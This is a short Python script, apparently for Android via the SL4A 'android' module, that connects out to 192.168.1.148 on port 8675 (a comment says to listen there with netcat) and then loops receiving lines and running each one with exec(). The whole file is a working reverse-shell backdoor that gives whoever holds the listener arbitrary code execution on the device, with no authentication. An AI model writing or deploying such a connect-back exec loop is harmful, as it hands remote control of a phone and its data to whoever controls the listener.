import socket
import android

droid = android.Android()

client = socket.create_connection(("192.168.1.148", 8675)) # to connect back to home to $nc -l -p 8675

def reply(str):
	client.send(str + "\n")

while True: # <-----------------------+
	line = client.recv(1024) #read    |
	cmd = line.replace("\n", "") #    |
	print "==>", cmd #eval/exec       |
	exec(cmd) #                       |
	# print result #print               | # apparently no print
	# reply(result) #                   |
	# loop ---------------------------+